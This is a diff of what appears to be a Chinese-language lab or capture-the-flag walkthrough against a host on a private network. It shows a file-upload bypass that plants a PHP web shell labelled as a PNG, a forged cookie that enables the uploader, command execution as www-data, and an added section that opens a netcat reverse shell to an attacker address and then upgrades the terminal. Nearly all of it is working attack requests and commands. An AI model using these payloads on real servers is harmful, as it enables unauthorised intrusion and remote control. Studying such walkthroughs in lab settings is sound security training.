@@ -102,7 +102,7 @@ Cookie: RW5hYmxlVXBsb2FkZXIK=dHJ1ZQ==
 Upgrade-Insecure-Requests: 1
 
 -----------------------------30594177056923721121592264423
-Content-Disposition: form-data; name="fileToUpload"; filename="logo.phtml"
+Content-Disposition: form-data; name="fileToUpload"; filename="1.phtml"
 Content-Type: image/png
 <?php system($_GET['cmd']);?>
 -----------------------------30594177056923721121592264423
@@ -117,3 +117,19 @@ Upload Image
 http://192.168.44.137/assets/img/1.phtml?cmd=id
 uid=33(www-data) gid=33(www-data) groups=33(www-data) 
 ```
+
+# nc反弹shell
+```css
+http://192.168.44.137/assets/img/1.phtml?cmd=nc -e /bin/sh 192.168.44.128 9001
+```
+
+```c
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+或者
+script /dev/null -c bash
+export TERM=xterm
+Ctrl+z快捷键
+stty raw -echo;fg
+reset
+```
+目前看啥都没权限
